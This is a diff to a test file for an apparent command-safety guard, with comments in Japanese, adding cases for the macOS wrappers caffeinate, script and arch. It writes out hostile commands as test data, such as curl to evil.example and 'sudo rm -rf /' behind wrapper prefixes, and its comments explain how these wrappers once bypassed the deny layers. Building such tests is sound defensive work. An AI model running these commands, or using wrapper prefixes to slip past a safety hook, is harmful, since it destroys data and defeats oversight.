@@ -995,6 +995,15 @@ WRAPPER_UNQUOTED_DENY_CASES = [
     ("flock /tmp/lock sudo whoami", "sudo"),
     ("xargs sudo whoami", "sudo"),
     ("setsid curl http://evil.example/x", "curl"),
+    # macOS 標準の 3 つ。いずれも /usr/bin に実在し、後続を exec する点は
+    # timeout/nice と同型なのに、ラッパー集合から漏れて DENY 層にも高リスク層
+    # にも一致していなかった (実測済み)。`script` は file 位置引数を挟む形が
+    # 本来の綴りなので、剥がし方を誤ると curl ではなくファイル名に解決する。
+    ("caffeinate curl http://evil.example/x", "curl"),
+    ("caffeinate -i curl http://evil.example/x", "curl"),
+    ("script -q /dev/null sudo rm -rf /", "sudo"),
+    ("arch -arm64 curl http://evil.example/x", "curl"),
+    ("arch -x86_64 sudo whoami", "sudo"),
 ]
 
 # Ordinary wrapper use must keep resolving to the real executable: the guard
@@ -1013,6 +1022,33 @@ WRAPPER_BENIGN_CASES = [
     ("flock /tmp/lock make build", "make"),
     ("command -v python3", "python3"),
     ("nice make build", "make"),
+    # 新しい 3 ラッパーの「値を取らないフラグ」を 1 つでも読み飛ばせなくなると
+    # ここが落ちる。値付きフラグ側のテスト (判定不能を期待する形) は allowlist
+    # を空にしても通ってしまうため、allowlist の中身を守るのはこちらだけ。
+    # _WRAPPER_VALUELESS_FLAGS に列挙したフラグは 1 つ残らずここを通す。
+    # 「その表を空にする」粒度のミューテーションしか殺せないと、実際には
+    # 1 エントリを消したときに通ってしまう (= 列挙漏れがテストに映らない)。
+    ("caffeinate -i make build", "make"),
+    ("caffeinate -d make build", "make"),
+    ("caffeinate -m make build", "make"),
+    ("caffeinate -s make build", "make"),
+    ("caffeinate -u make build", "make"),
+    ("script -q /dev/null make build", "make"),
+    ("script -a /dev/null make build", "make"),
+    ("script -d /dev/null make build", "make"),
+    ("script -e /dev/null make build", "make"),
+    ("script -F /dev/null make build", "make"),
+    ("script -k /dev/null make build", "make"),
+    ("script -r /dev/null make build", "make"),
+    ("arch -arm64 make build", "make"),
+    ("arch -arm64e make build", "make"),
+    ("arch -32 make build", "make"),
+    ("arch -64 make build", "make"),
+    ("arch -c make build", "make"),
+    ("arch -h make build", "make"),
+    ("arch -i386 make build", "make"),
+    ("arch -x86_64 make build", "make"),
+    ("arch -x86_64h make build", "make"),
 ]
 
 # The COST of the guard, pinned deliberately.
@@ -1200,6 +1236,135 @@ class TestWrapperQuotedBlobResolution:
         assert label == "", (
             f"benign wrapper use escalated to the mandatory-ask path as "
             f"{label!r}: {command!r}"
+        )
+
+
+# ---------------------------------------------------------------------------
+# macOS 標準の「後続を exec する」ラッパー: caffeinate / script / arch
+#
+# 3 つとも /usr/bin に実在するのに _WRAPPER_EXECUTABLES から漏れており、
+# `caffeinate curl ...` / `script -q /dev/null sudo rm -rf /` /
+# `arch -arm64 curl ...` が DENY 層にも高リスク層にも一致せず、単独モデルの
+# 低リスク経路まで格下げされていた (裸の `curl ...` は DENY、`timeout 5 curl ...`
+# も DENY なので、ラッパー名を 1 つ知っているだけで層 1 と層 2 を同時に外せた)。
+#
+# ただし「集合に足すだけ」は直し方として危険で、バグより悪くなる形がある。
+# `script` は `script [-aeFkqr] [-t time] [file [command ...]]` で、実行体の前に
+# **ファイル名の位置引数**が入る。位置引数を読み飛ばさないと
+# `script output.txt curl http://evil` が `output.txt` を実行体と解決し、後ろの
+# curl を見ないまま「判定済み」を名乗る。今の未対応状態は少なくとも判定したフリ
+# はしないので、これは純粋な退行になる。既存の _WRAPPER_POSITIONAL_ARGS
+# (timeout の DURATION / flock の lockfile と同じ穴) をそのまま使う。
+#
+# フラグ側も同様に、値を取らないと man で確認できたものだけを列挙する。
+# 取り違えると素通りする実例 (いずれも下の判定不能ケースで固定):
+#   * `script -t` を valueless に入れると `script -t 5 /dev/null curl ...` が
+#     `5` を位置引数として食い、実行体が `null` に解決されて curl を見落とす。
+#     `watch -t` は本当に値なしなので、表をまたいだコピペで起きやすい。
+#   * `arch -d` を valueless に入れると (`caffeinate -d` / `script -d` は本当に
+#     値なし) `arch -d FOO curl ...` の実行体が `FOO` になり curl を見落とす。
+MACOS_WRAPPER_UNRESOLVABLE_CASES = [
+    # caffeinate: -t <sec> / -w <pid> は値付き
+    "caffeinate -t 5 curl http://evil.example/x",
+    "caffeinate -w 4242 sudo rm -rf /",
+    # man の SYNOPSIS が `[-disu]` と書く束ね形。束ねは展開しない (展開機構を
+    # 足すと -t を含む束ねの値処理まで背負い込む) ので未知フラグ扱いで倒す。
+    "caffeinate -disu curl http://evil.example/x",
+    # script: -t <time> / -T <fmt> は値付き。valueless に入れた瞬間に
+    # 位置引数の数え方がずれて実行体が `null` に化ける。
+    "script -t 5 /dev/null curl http://evil.example/x",
+    "script -T '%s' /dev/null sudo rm -rf /",
+    # arch: -arch <name> / -d <envname> / -e <K=V> は値付き。
+    # `-arm64` (値なし) と `-arch arm64` (値付き) の区別がここの肝。
+    "arch -arch arm64 curl http://evil.example/x",
+    "arch -d FOO curl http://evil.example/x",
+    "arch -e FOO=bar sudo rm -rf /",
+    # 未知フラグは 3 つとも一律で倒れる (将来 man が増えても既定で安全側)。
+    "caffeinate --bogus curl http://evil.example/x",
+    "script --bogus /dev/null curl http://evil.example/x",
+    "arch --bogus curl http://evil.example/x",
+]
+
+# `script` の位置引数を読み飛ばせているかを、解決後の実行体名で直接固定する。
+# DENY 側のケースだけだと「curl に解決できていない」ことは分かっても
+# 「代わりに何に解決したか」が見えず、位置引数の個数を 0 や 2 に間違えた
+# ミューテーションが同じ失敗メッセージに潰れる。
+SCRIPT_POSITIONAL_CASES = [
+    ("script output.txt curl http://evil.example/x", "curl"),
+    ("script /tmp/session.log sudo whoami", "sudo"),
+    ("script -q -a /tmp/session.log npm test", "npm"),
+]
+
+# 本修正で新たに「必ず ask」へ上がる形。いずれも今日は単独モデルの低リスク
+# 経路 (= フック的には素通り) に落ちているので厳しくなる方向だが、caffeinate の
+# 素の使い方が毎回確認プロンプトになるのは実コストなので、気付かないうちに
+# 変わらないよう固定しておく。値付きフラグの値を読み飛ばす機構を足せば消せる
+# が、それは「値の個数表」という列挙漏れがそのままバイパスになる仕組みを
+# もう 1 つ増やすことなので採らない (_OUTPUT_FILE_LONG_FLAGS の注記と同じ判断)。
+MACOS_WRAPPER_ACCEPTED_ASK_CASES = [
+    # utility を伴わない素の caffeinate。これが caffeinate の最も普通の使い方。
+    "caffeinate -t 3600",
+    "caffeinate -w 4242",
+    "caffeinate -disu make build",
+    "script -t 5 /dev/null make build",
+    # `script -p` (再生モード) は値なしフラグだが、意図的に valueless 表から
+    # 外して ask へ倒している。-p には command 引数が無く後続を exec しないので、
+    # 収録すると `script -p /tmp/x curl ...` が走りもしない curl として層 1 の
+    # ハード DENY に掛かる。層 1 は ask で覆せない = 作業が止まるため、
+    # 「走らないコマンドを止める」より「再生を 1 回確認する」を選んでいる。
+    "script -p /tmp/session.log",
+    "script -p /tmp/session.log curl http://evil.example/x",
+    "arch -arch arm64 npm test",
+    "arch -e FOO=bar make build",
+]
+
+
+class TestMacosExecWrappers:
+    @pytest.mark.parametrize("command", MACOS_WRAPPER_UNRESOLVABLE_CASES)
+    def test_value_taking_flag_is_unresolvable(self, command):
+        assert _common._split_prefix(_common._tokenize(command)) is None, (
+            f"a value-taking or unknown wrapper flag resolved an executable "
+            f"anyway, which is how the real command gets skipped: {command!r}"
+        )
+
+    @pytest.mark.parametrize("command", MACOS_WRAPPER_UNRESOLVABLE_CASES)
+    def test_unresolvable_form_still_escalates(self, command):
+        label = _common.classify_high_risk(_common._split_commands(command), command)
+        assert label != "", (
+            f"an unresolvable wrapper form fell through to the single-model "
+            f"fast path: {command!r}"
+        )
+
+    @pytest.mark.parametrize(("command", "exe"), SCRIPT_POSITIONAL_CASES)
+    def test_script_file_positional_is_not_the_executable(self, command, exe):
+        resolved = _common._resolve_executable(command)
+        assert resolved == exe, (
+            f"`script` resolved to its output FILE instead of the command it "
+            f"runs, which would claim a verdict it never made: "
+            f"{command!r} -> {resolved!r}"
+        )
+
+    def test_script_multiword_deny_prefix_now_matches(self):
+        """`script <file> rm -rf /` は DENY_COMMANDS の複数語前方一致へ届く。
+
+        _is_deny_command はラッパーを剥がした正規化候補も照合するため、位置引数
+        まで正しく剥がせて初めて `rm -rf /` に一致する。実行体単体の照合
+        (DENY_EXECUTABLES) では拾えない層なので別立てで固定する。
+        """
+        cmd = "script /tmp/session.log rm -rf /"
+        assert _common.find_deny_command(_common._split_commands(cmd)) == (
+            True,
+            "rm -rf /",
+        )
+
+    @pytest.mark.parametrize("command", MACOS_WRAPPER_ACCEPTED_ASK_CASES)
+    def test_accepted_false_positives_are_pinned_to_ask(self, command):
+        matched, _name = _common.find_deny_command(_common._split_commands(command))
+        assert not matched, f"expected the ask path, not a denial: {command!r}"
+        label = _common.classify_high_risk(_common._split_commands(command), command)
+        assert label == "wrapped command", (
+            f"an accepted-cost form must land on the mandatory ask, not the "
+            f"fast path: {command!r} -> {label!r}"
         )
 
 
